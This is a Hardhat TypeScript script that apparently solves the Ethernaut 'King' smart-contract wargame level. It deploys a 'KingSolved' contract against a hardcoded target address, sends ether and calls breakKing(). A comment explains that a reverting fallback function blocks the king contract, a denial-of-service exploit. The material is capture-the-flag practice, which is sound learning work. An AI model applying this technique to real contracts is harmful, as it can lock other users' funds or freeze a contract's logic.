// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
// When running the script with `hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { parseEther, parseUnits } from 'ethers/lib/utils';
import { ethers } from 'hardhat';


async function main(): Promise<void> {
  // Hardhat always runs the compile task when running scripts through it.
  // If this runs in a standalone fashion you may want to call compile manually
  // to make sure everything is compiled
  // await run("compile");
  // We get the contract to deploy
  const [deployer] = await ethers.getSigners();
  const kingAddress = "0xb7DF4B7F6750aA52EC2EB8FBD8201475804b2F38"
  console.log(deployer.address);

  const KingSolvedFactory = await ethers.getContractFactory("KingSolved");
  const kingSolved = await KingSolvedFactory.deploy(
    kingAddress,
    {
    value: parseEther("0.002"), 
    gasLimit: parseUnits("100000", "1")
    }
  );
  await kingSolved.deployed()
  console.log('kingSolved deployed to: ', kingSolved.address);

  // adding a revert in fallback function of kingsolved should do the trick
  const tx = await kingSolved.breakKing({ 
    gasLimit: parseUnits("500000", "1")
  })
  console.log(tx)
  const receipt = await tx.wait()
  console.log(receipt)
  
  
} 

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error: Error) => {
    console.error(error);
    process.exit(1);
  });
